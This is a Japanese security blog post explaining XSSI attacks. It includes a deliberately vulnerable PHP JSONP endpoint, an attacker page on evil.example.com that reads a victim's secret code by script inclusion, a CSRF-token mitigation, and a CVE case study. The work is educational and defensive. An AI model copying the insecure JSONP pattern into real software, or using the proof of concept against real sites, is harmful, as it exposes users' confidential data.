<div style="text-align:center;">[f:id:motikan2010:20180303225303p:plain:w500]</div>

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

　今回はWebセキュリティのお話です。  

　とある機会に<span style="color: #ff0000">XSSI（Cross-Site Script Inclusion : クロスサイト・スクリプト・インクルージョン）攻撃</span>というワードが話に出てきて、その攻撃が正直分からず困惑してしまったので、その攻撃について調べてみました。  
  
　結論としては「Same-Origin Policy制限外のJSONPなどからは機密情報を外部ドメインから取得できる攻撃」です。  

　本記事では、脆弱性あるサンプルアプリケーションを使い、実際に攻撃を行ってみて当脆弱性を確認していきます。  

<!-- more -->


## 攻撃名からの勝手な予想（※誤り）

　帰宅中の電車内でどんな攻撃だろうかと予想していました。  （※下記の予想は外れています）

　下記がその予想内容です。  

- XSSと名前が非常に似ている為、何かしらのエスケープ漏れ（脆弱性）で発生する。
- XSSIというワードを 見た/聞いた だけでしたので、正称は「Cross Site Scripting <span style="color: #ff0000">Injection</span>」。  
そして「SQL <span style="color: #ff0000">injection</span>」「OS Command <span style="color: #ff0000">injection</span>」「Server-Side Template <span style="color: #ff0000">Injection</span>」と同じく攻撃者が能動的に攻撃ができるとてもヤバい分類の攻撃。
- XSSの別名で、XSSを目新しく言うためのセキュリティベンダの独自ワード。

　<span class="m-y">結論から言うと、どれも間違っていました。</span>  

　エスケープの漏れは関係なく、攻撃者が能動的にWebサーバに攻撃できるものでもありません。正称は「Cross-Site Script <span style="color: #ff0000">Inclusion</span>（スクリプト・インクルージョン）」です。

　これらを整理すると、  

- エスケープ漏れは関係ない
- 影響発生のトリガーはXSSと同じく被害者が罠サイトへのアクセス

### 結局何ができるのか

　一言で表すと「特定のユーザでしかアクセスできない情報に攻撃者がアクセス可能」となる脆弱性です。  
  
[f:id:motikan2010:20180303202014p:plain]  

　この一言や図ですぐに頭に思い浮かべることは「Same-Origin Policy(同一生成元ポリシー)によるブロック」ということです。  

　復習を兼ねて「Same-Origin Policy」の挙動を確認します。  

## Same-Origin Policyを確認

　もし「Same-Origin Policy」が存在しないブラウザで、下のコードを含んだ罠サイトにAmazonにログインユーザがアクセスした場合は注文履歴のレスポンスが攻撃者に送信されていまうことになります。

<div class="md-code" style="width:100%">
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.amazon.co.jp/gp/your-account/order-history", true); // Amazon の注文履歴を取得
xhr.onload = function (e) {
    if (xhr.readyState === 4) {
        if (xhr.status === 200) {
            console.log(xhr.responseText); // 返却されたレスポンス内容
            // ごにょごにょして攻撃者にレスポンス内容を送信処理
        }
    }
};
xhr.send(null);
</script>
```
</div>

　もちろん、主要なブラウザはそのような挙動はせずに下記のようなアクセス違反のエラーメッセージが表示されれます。
[f:id:motikan2010:20180303204149p:plain]  

　その仕組みのおかげで、別ドメインに存在しているリソースに安易にアクセスできないようになっています。  

## XSSIは結局何ができるのか  

　実際にサンプルアプリケーションを動かして、XSSI攻撃がどのようなものなのを見ていきます。  
　途中JSONPについても軽くふれます。

▼ 説明で使用しているコードはこちら
[https://github.com/motikan2010/XSSI-Sample:embed:cite]  

### 脆弱性が存在するサイト（bank.example.jp）

1. 「bank.example.jp」にアクセス
[f:id:motikan2010:20180303212436p:plain]  
2. 「Get Secret Code」を押下すると、シークレットコードが発行されます。  
　このコードは別のユーザに取得されてはいけない機密情報としてここでは扱います。
[f:id:motikan2010:20180303212429p:plain]  
  
3. シークレットコードは<b>セッションに保存</b>されているため、常に同じ値が返却されることになっています。  

##### トップページ（index.php）

<div class="md-code" style="width:100%">
```html
<!-- Unsecure -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>bank.example.jp</title>
</head>
<body>
<h3>bank.example.jp</h3>
<button id="get-date-btn">Get Secret Code</button><br/>
あなたのシークレットコードは「<span id="secret-code-text"></span>」です。

<script type="text/javascript">
displaySecretData = function(secretDate) {
    var span = document.getElementById('secret-code-text')
    span.innerHTML= secretDate['secret_code'];
};

window.onload = function(){
    var btnGetData = document.getElementById("get-date-btn");
    btnGetData.addEventListener("click",function() {
        var scriptTag = document.createElement("script");
        scriptTag.type = 'text/javascript';
        scriptTag.src = "userdata.php?callback=displaySecretData";
        var parent = document.getElementsByTagName("script")[0];
        parent.parentNode.insertBefore(scriptTag, parent);
    }, false);
}
</script>
</body>
</html>
```
</div>

##### シークレットコードを生成し、JSONPを活用（userdata.php）

<div class="md-code" style="width:100%">
```php
<?php
session_start();

if (empty($_SESSION['secret_code'])) {
    $_SESSION['secret_code'] = uniqid();
}

function getSecretCode($secret_code) {
    return ['secret_code' => $secret_code];
}

$callback = "jsonCallback";
if(isset($_GET['callback'])){
    $callback = $_GET['callback'];
}

// ユーザのシークレットコードを取得
$result = getSecretCode($_SESSION['secret_code']);

$json = json_encode($result, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);

header("Content-type: application/x-javascript");
echo "$callback($json)";
```   
</div>

「Get Secret Code」を押下すると
<div class="md-code" style="width:100%">
```html
<script type="text/javascript" src="userdata.php?callback=displaySecretData"></script>
```
</div>
というscriptタグが動的に生成されます。  

　読み込んだJavaScriptの内容は下記の通りで、JSON形式のシークレットコードをdisplaySecretData関数に渡す処理です。
<div class="md-code" style="width:100%">
```
displaySecretData({"secret_code":"5a9a8fb2d3751"})
```
</div>
　重要なことは、JSONPを用いて機密情報を返していると言うことです。  
JSONPのWikiを見てみると、
> JSONP (JSON with padding) とは、scriptタグを使用して<b>クロスドメインな（異なるドメインに存在する）データを取得する仕組み</b>のことである。HTMLのscriptタグ、JavaScript（関数）、JSONを組み合わせて実現される。  
  
とあります。(ﾉ∀`)ｱﾁｬｰ  
  
　先に説明した「Same-Origin Policy」を回避する手段としてこの仕組みが存在していますが、回避できるということは、外部ドメインからそのリソースにアクセス可能であることを意味します。  
  
　Wikiを読み進めていくと下記の文言があります。
>scriptタグを埋め込む側においては、リモートサイトは任意の内容のデータをページに差し込むことが可能であるため、その<b>リモートサイトが悪意のあるサイト</b>である場合やJavaScriptインジェクションに対する脆弱性がある場合は、<b>その脆弱性を突かれることで、アカウント情報を盗まれたり</b>、元のサイトも影響を受けたりする可能性がある。

　その脆弱性を悪用する攻撃がこそが「<b>XSSI（Cross-Site Script Inclusion）攻撃</b>」ということになります。  

#### 攻撃者が用意したサイト (evil.example.com)

　アクセスの際、シークレットコードが読み取られていることが確認できます。  
仕組みは非常に単純です。  

[f:id:motikan2010:20180303215301p:plain]

##### トップページ (index.html)

<div class="md-code" style="width:100%">
```html
<!DOCTYPE html>
<html>
<head>
    <title>www.evil.example.com</title>
</head>
<body>
<h3>www.evil.example.com</h3>

<script type="text/javascript">
displaySecretData = function(secretDate) {
    alert(secretDate['secret_code']);
};
</script>
<script src="http://bank.example.jp/unsecure/userdata.php?callback=displaySecretData"></script>
</body>
</html>
```
</div>

<div class="md-code" style="width:100%">
```html
<script src="http://bank.example.jp/unsecure/userdata.php?callback=displaySecretData"></script>
```
</div>
というscriptタグが含まれています。  
　ブラウザは「 `http://bank.example.jp` 」というドメインにアクセスするので、セッション情報が格納されているCookieを送信します。セッション情報からシークレットコードという機密情報が取得されレスポンスとして返却されます。
その返却先が罠サイトであるため、取得した情報をアラートとして表示しています。アラートではなく攻撃者元にその情報を送信することも可能です。  

## 対策

#### CSRFトークンによる対策

<span style="color: #ff0000">※ここで使用しているCSRFトークンは、安易な実装であり、実際に使えないものです。</span>    
JavaScriptを読み込む時にCSRFトークンをGETパラメータに含めるように修正しました。
<div class="md-code" style="width:100%">
```
scriptTag.src = "userdata.php?callback=displaySecretData&csrf_token=<?php echo $csrfToken ?>";
```
</div>
　データの取得にCSRF対策をするのはなかなか新鮮ですね。
[f:id:motikan2010:20180303221119p:plain]

その他対策に関する記事  
・PROJEKT: SEGELFALTER DEBRIEFING  
[https://www.owasp.org/images/9/9a/20160607-xssi-the_tale_of_a_fameless_but_widepsread_vulnerability-Veit_Hailperin.pdf#page=26]  

## まとめ

　駆け足で XSSI を説明してみましたが、下記の参考記事を見てみるとJSONP以外にもパターンが色々ありそうです。  
JSONPはその中の攻撃対象の１つに過ぎないとということでしょうか。    

　実装するときに「Same-Origin Policy」のことは考えていないというのは正直ありました。JSONPを実業務で利用したことはありませんでしたが、ユーザによって動的にJavaScriptファイルを作成するような実装を行うときは注意が必要ですね。

## 事例

　XSSIは普段あまり目にしない攻撃ですが、実際にXSSIが見つかった事例を紹介します。

### 事例1 : Pulse SecureのVPN製品（CVE-2019-11540）
　VPN製品に見つかった脆弱性であり、セッション情報が取得される可能性がある脆弱性であり、CVSS v3のベーススコアが 9.8（CRITICAL） と高くなっています。  

　この脆弱性が紹介されているブログには、JavaScript内にセッションIDが含まれるエンドポイントが存在しており、そのJavaScriptが読み込まれてセッション情報を盗めるとあります。

[https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html#CVE-2019-11540-Cross-Site-Script-Inclusion:title]  

## 参考記事

- <span><a href="https://www.mbsd.jp/Whitepaper/xssi.pdf" target="_blank">Identifier based XSSI attacks</a></span>
- <span><a href="https://www.securityfocus.com/archive/1/535268" target="_blank">SecurityFocus</a></span>
- <span><a href="https://www.scip.ch/en/?labs.20160414" target="_blank">Cross-Site Script Inclusion - A Fameless but Widespread Web Vulnerability Class</a></span>
- <span><a href="https://stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi" target="_blank">xss - What is Cross Site Script Inclusion (XSSI)? - Stack Overflow</a></span>
- <span><a href="https://qiita.com/kojisaiki/items/f277c8323c6d53c65870#xssi" target="_blank">Angular（>=2.x）はセキュリティに対してどのような提案をしているか - Qiita</a></span>
- <span><a href="https://qiita.com/stkdev/items/f3e6cae58ab73faee502" target="_blank">JSONPをごりごり実装するときのポイント - Qiita</a></span>
- <span><a href="https://www.owasp.org/images/9/9a/20160607-xssi-the_tale_of_a_fameless_but_widepsread_vulnerability-Veit_Hailperin.pdf#page=26" target="_blank">PROJEKT: SEGELFALTER DEBRIEFING</a></span>

## 更新履歴

- 2018年 3月 3日 新規作成
- 2019年11月 5日 事例追加



